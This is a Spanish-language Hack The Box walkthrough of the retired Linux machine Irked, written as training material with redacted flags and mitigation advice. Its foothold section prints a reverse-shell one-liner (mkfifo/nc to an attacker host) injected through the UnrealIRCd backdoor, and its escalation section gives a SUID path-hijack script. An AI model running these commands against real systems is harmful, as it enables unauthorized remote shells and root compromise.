---
machine: Irked
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, unrealircd, backdoor, cve-2010-2075, steghide, suid, path-hijack]
---

# Irked — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un UnrealIRCd 3.2.8.1 trojanizado contiene el backdoor de 2010: una línea que empieza por `AB;` se pasa a `system()`. La web esconde una pista y una imagen con credenciales SSH mediante steghide. El usuario `djmardov` puede ejecutar un binario SUID que llama a `/tmp/listusers`; al crear ese archivo se obtiene root.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p22,80,111,6697,8067,65534 <IP>
```

- SSH, HTTP, rpcbind y varios puertos IRC.
- La página principal menciona IRC y muestra una imagen.
- `nmap` marca el servicio 6697 como UnrealIRCd.

## Enumeración

```bash
curl -s http://<IP>/ | head
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x txt,php
```

- El webroot contiene una imagen y un archivo de pista oculto.
- La pista describe una contraseña para extraer datos de la imagen.
- `searchsploit unrealircd 3.2.8.1` confirma el backdoor.

## Foothold

El backdoor interpreta cualquier línea que comience por `AB;` y ejecuta el resto como comando del sistema. Se envía una reverse shell por el puerto IRC.

```bash
nc <IP> 6697
AB; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <LHOST> 443 >/tmp/f
```

La shell corre como `ircd`. Se estabiliza con `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

## Movimiento lateral

La imagen de la web se descarga y se extrae con la contraseña de la pista:

```bash
steghide extract -sf irked.jpg
cat creds.txt
ssh djmardov@<IP>
```

Las credenciales extraídas permiten SSH como `djmardov`; se lee `user.txt`.

## Escalada de privilegios

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /usr/bin/viewuser
```

`viewuser` es SUID de root y ejecuta `/tmp/listusers` sin comprobar que sea un archivo confiable. El directorio `/tmp` es escribible.

```bash
printf '#!/bin/bash\n/bin/bash\n' > /tmp/listusers
chmod +x /tmp/listusers
/usr/bin/viewuser
id
```

La shell resultante es de root. También se puede usar una reverse shell en el script.

## Evidencia

- Respuesta de IRC al payload y `id` como `ircd`.
- `steghide` y credenciales redactadas.
- `ls -l` del SUID y `id` como root.
- Flag redactada.

## Lecciones aprendidas

- Un servicio con una versión troyanizada es una puerta trasera, no una vulnerabilidad de configuración.
- La esteganografía sigue siendo una forma de transporte de credenciales.
- Un SUID que ejecuta una ruta escribible es una escalada directa.

## Mitigaciones y detección

- Verificar firmas y procedencia del software; actualizar UnrealIRCd.
- No publicar pistas ni credenciales en imágenes o archivos del webroot.
- Retirar SUID innecesarios y comprobar rutas absolutas antes de ejecutar.
- Alertar de conexiones IRC con `AB;`, procesos hijos del servicio y creación de `/tmp/listusers`.

## Referencias

- <https://www.hackthebox.com/machines/Irked>
- <https://nvd.nist.gov/vuln/detail/CVE-2010-2075>
- <https://attack.mitre.org/techniques/T1195/002/>
- <https://attack.mitre.org/techniques/T1548/001/>
